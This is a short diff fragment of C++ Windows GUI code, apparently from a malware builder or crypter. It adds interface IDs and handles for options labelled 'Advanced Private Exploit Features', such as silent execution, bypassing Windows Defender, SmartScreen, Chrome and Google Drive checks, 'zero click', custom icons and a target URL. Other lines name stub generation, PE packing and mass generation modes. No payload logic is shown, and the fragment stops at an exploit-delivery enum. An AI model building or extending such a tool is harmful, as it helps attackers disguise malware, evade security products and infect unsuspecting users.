@@ -70,12 +70,36 @@ constexpr int ID_MODE_GROUP = 1018;
 constexpr int ID_EXPLOIT_COMBO = 1019;
 constexpr int ID_ENCRYPTION_COMBO = 1020;
 
+// Advanced Private Exploit Features
+constexpr int ID_SILENT_EXEC_CHECK = 1021;
+constexpr int ID_BYPASS_DEFENDER_CHECK = 1022;
+constexpr int ID_BYPASS_CHROME_CHECK = 1023;
+constexpr int ID_BYPASS_SMARTSCREEN_CHECK = 1024;
+constexpr int ID_BYPASS_GDRIVE_CHECK = 1025;
+constexpr int ID_ZERO_CLICK_CHECK = 1026;
+constexpr int ID_CUSTOM_ICON_EDIT = 1027;
+constexpr int ID_CUSTOM_ICON_BROWSE = 1028;
+constexpr int ID_TARGET_URL_EDIT = 1029;
+constexpr int ID_BYPASS_ALL_CHECK = 1030;
+
 // Global variables for mass generation
 bool g_massGenerationActive = false;
 HANDLE g_massGenerationThread = NULL;
 
 // Global variables for mode selection
 int g_currentMode = 1; // 1=Stub Only, 2=PE Packing, 3=Mass Generation
+
+// Global variables for advanced private exploit features
+HWND g_hSilentExecCheck;
+HWND g_hBypassDefenderCheck;
+HWND g_hBypassChromeCheck;
+HWND g_hBypassSmartScreenCheck;
+HWND g_hBypassGDriveCheck;
+HWND g_hZeroClickCheck;
+HWND g_hBypassAllCheck;
+HWND g_hCustomIconEdit;
+HWND g_hCustomIconBrowse;
+HWND g_hTargetUrlEdit;
 
 // Exploit Delivery Types
 enum ExploitDeliveryType {
